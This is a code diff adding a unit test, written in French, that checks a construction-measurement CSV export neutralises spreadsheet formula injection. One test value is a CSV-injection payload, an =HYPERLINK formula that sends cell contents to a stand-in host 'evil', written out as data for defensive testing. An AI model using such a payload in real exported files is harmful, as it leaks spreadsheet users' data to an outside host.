@@ -264,6 +264,18 @@ describe("Lot 8 — synthèse, CSV, contrat Gestion Pro", () => {
     expect(metreLignes(tree)).toHaveLength(8 + 7);
   });
 
+  it("CSV : un nom saisi commençant par une formule est neutralisé, un nombre négatif reste un nombre", () => {
+    const piegee = buildMetreTree(
+      { ...structure, pieces: [{ ...structure.pieces[0], nom: '=HYPERLINK("http://evil/?"&A1,"x")' }, structure.pieces[1]] },
+      sources,
+      { id: "r1", nom: "@SUM(1)" },
+    );
+    const csv = metreToCsv(piegee);
+    expect(csv).toContain(`"'=HYPERLINK(""http://evil/?""&A1,""x"")"`);
+    expect(csv).not.toMatch(/(^|;)=HYPERLINK/m);
+    expect(csv).toContain(";10,64;m²;");
+  });
+
   it("contrat GP : unités d'échange exactes (m, m², m³), pas de prix, clé d'idempotence", () => {
     const payload = buildMetreGpPayload(tree, sources, "existant");
     expect(payload.pieces[0]).toMatchObject({ surfaceSolM2: 10.64, perimetreUtileM: 12.3, surfaceMursNetteM2: 29.75, volumeM3: 26.6, hauteurM: 2.5 });
